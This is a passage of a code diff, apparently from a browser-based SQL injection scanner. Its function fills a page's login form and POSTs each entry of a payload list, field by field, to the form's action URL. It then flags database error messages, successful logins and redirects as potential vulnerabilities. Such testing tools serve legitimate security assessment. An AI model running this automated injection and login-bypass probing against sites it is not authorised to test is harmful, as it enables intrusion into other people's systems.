+    // create dummy dom element to parse the html string
     const parser = new DOMParser();
-    console.log(formContainer);
     const doc = parser.parseFromString(html, 'text/html');
-    // get the login form and add a submit event listener to intercept the submission
+    // get the form with id from formContainer
     const loginForm = doc.getElementById(formContainer);
-    console.log(loginForm);
+    // get path name of id from formContainer
     const loginAction = new URL(loginForm.action).pathname;
-    console.log(loginAction);
-    // if(loginAction.includes('.')){
-
-    // }
-    // else{}
+   // split the URL https://example.com/product.php into https://example.com/ and product.php
     const splitUrl = currentURL.split('/');
+    // ensure URl is https://example.com
     const domain = splitUrl.slice(0, -1).join('/');
-    const page = splitUrl[splitUrl.length - 1];
     let newUrl = "";  
+    // check if the path name from loginAction has .
     if(loginAction.includes('.')){
       const fileExtension = loginAction.split('.').pop();
       if(fileExtension === 'php' || fileExtension === 'com' || fileExtension === 'jsp'){
+        // concatenate https://example.com with the path name
         newUrl = domain + loginAction;
       }
       else{
+        // concatenate https://example.com with the path name
         newUrl = domain + loginAction;
       }
     }
     else{
+      // concatenate https://example.com with the path name
       newUrl = domain + loginAction;
     }
     console.log(newUrl);
+    // get all input field with type text, password or email
     const inputFields = loginForm.querySelectorAll('input[type=text], input[type=password], input[type=email]');
 
-    console.log(inputFields);
     const payloadObj = {};
+    // loop to get all the value of the input field and add them to payloadObj array
     inputFields.forEach(function(input){
       const inputName = input.getAttribute('name');
       const inputValue = document.getElementById(inputName).value;
+      // check if inputValue is null if null the input value is 123
       if(!inputValue){
         input.value = "123";
         payloadObj[inputName] = "123";
@@ -808,57 +683,62 @@ function checkAllSQLInjection(formContainer) {
       }
       
     })
+    // get the value of the button with input field type submit
     const buttonFields = loginForm.querySelector('input[type=submit]')
     const buttonName = buttonFields.getAttribute('name');
     const buttonValue = buttonFields.value;
+    // check if button exist
     if(!buttonName){
       
     }
     else{
+      // add button to payloadObj array
       payloadObj[buttonName] = buttonValue;
     }
-    // loop over the input fields
+    // loop over input fields
     for (const input of inputFields) {
       const inputName = input.getAttribute('name');
 
-      // loop over the payloads
+      // loop over payloads
       for (const payload of payloads) {
-        // create a copy of the payload object to modify
+        // create copy of the payload object to modify
         const newPayloadObj = { ...payloadObj };
         newPayloadObj[inputName] = payload;
 
-        // create the payload string
+        // create payload string
         const payloadStr = Object.entries(newPayloadObj)
           .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
           .join('&');
-        // send the request with the modified payload
+        // create new XMLHttpRequest object
         const xhr = new XMLHttpRequest();
+        // set request method
         xhr.open('POST', newUrl);
         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         xhr.addEventListener('load', function() {
+          // get response text and response url
           const responseText = xhr.responseText;
           const responseUrl = xhr.responseURL;
           let responseErrorText = ""
+          // check if response text content items from errors array
           if (errors.some(error => responseText.toLowerCase().includes(error.toLowerCase()))) {
-            // loop over the payload object and search for the name or ID of each input field
+            // loop newPayloadObject and search for name or id of each input field
             Object.keys(newPayloadObj).forEach(function(key) {
               const fieldValue = newPayloadObj[key];
               const fieldName = key.toLowerCase();
               if (payloads.includes(fieldValue)) {
               // check if the response text contains the name or ID of the input field
-                // if (responseText.includes(fieldName)) {
-                  responseErrorText = 'Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!';
-                  console.log(responseErrorText)
-                  // console.log('Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!');
-                // }
+                responseErrorText = 'Potential vulnerability found in ' + fieldName + ' field with payload "' + fieldValue +'"!';
               }
             });
           }
+          // check if response url is the same as current url
           else if(responseUrl !== currentURL){
             if(loginErrors.some(loginErrors => responseText.toLowerCase().includes(loginErrors.toLowerCase()))){
+              // loop newPayloadObject and search for name or id of each input field
               Object.keys(newPayloadObj).forEach(function(key) {
                 const fieldValue = newPayloadObj[key];
-                const fieldName = key.toLowerCase();         
+                const fieldName = key.toLowerCase(); 
+                // check if field value is the same as payloads array and print the response error 
                 if (payloads.includes(fieldValue)) {
                   responseErrorText = 'Log in to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
                   console.log(responseErrorText)
@@ -867,9 +747,11 @@ function checkAllSQLInjection(formContainer) {
               });
             }
             else{
+              // loop newPayloadObject and search for name or id of each input field
               Object.keys(newPayloadObj).forEach(function(key) {
                 const fieldValue = newPayloadObj[key];
-                const fieldName = key.toLowerCase();         
+                const fieldName = key.toLowerCase();
+                // check if field value is the same as payloads array and print the response error          
                 if (payloads.includes(fieldValue)) {
                   responseErrorText = 'Redirected to '+ responseUrl + ' from ' + fieldName + ' field with payload "' + fieldValue +'"!';
                   console.log(responseErrorText)
@@ -878,30 +760,33 @@ function checkAllSQLInjection(formContainer) {
               });
             }
           }
+          // loop newPayloadObject and search for name or id of each input field
           else{
             Object.keys(newPayloadObj).forEach(function(key) {
               const fieldValue = newPayloadObj[key];
               const fieldName = key.toLowerCase();
+              // check if field value is the same as payloads array and print the response error 
               if (payloads.includes(fieldValue)) {
                 responseErrorText = 'Error getting response with ' + fieldName + ' field with payload "' + fieldValue + '".'
               }
             })
           }
+           // add the response error text into index
           const responseError = document.createElement("p");
           const responseErrorNode = document.createTextNode(responseErrorText);
           responseError.appendChild(responseErrorNode);
           const element = document.getElementById('responseError');
           element.appendChild(responseError);
         });
+        // send the payload and submit the form
         xhr.send(payloadStr); 
           loginForm.submit();
+          // abort the xhr in 5 seconds
           setTimeout(() => {
             xhr.abort();
           }, 5000);
       }
     }
-    // send the payload and submit the form
-
   })
   .catch(function(error) {
     console.log(error);
